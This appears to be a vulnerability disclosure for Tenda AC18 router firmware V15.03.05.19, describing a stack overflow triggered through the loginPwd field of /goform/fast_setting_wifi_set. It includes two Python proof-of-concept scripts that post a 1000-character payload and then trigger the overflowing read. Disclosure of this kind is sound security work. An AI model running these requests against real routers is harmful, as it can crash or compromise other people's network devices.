## Overview

- The device's official website: https://www.tenda.com.cn/product/A18.html
- Firmware download website: https://www.tenda.com.cn/material/show/2683

## Affected version

V15.03.05.19(6318)

## Vulnerability details

In the TendaAC18 Firmware has a stack overflow vulnerability in the `/goform/fast_setting_wifi_set` url. The `v17` variable receives the `loginPwd` parameter from a POST request and is stored in the configuration item named `sys.userpass` through the SetValue function.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250926134827340.png)

`sys.userpass` configuration item can  be retrieved through the GetValue function in the `/goform/SysToolChangePwd` url.However, neither the GetValue function nor the SetValue function impose any restrictions on the length of variables, which can lead to stack overflows.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250926140216339.png)

## PoC

first SetValue

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/fast_setting_wifi_set"
payload = "a"*1000

data = {"ssid": "Tenda_66AE80","wrlPassword": "cardtable","loginPwd":payload}
response = requests.post(url, data=data)
print(response.text)
```

second GetValue

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/SysToolChangePwd"
response = requests.post(url)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250926141817071.png)
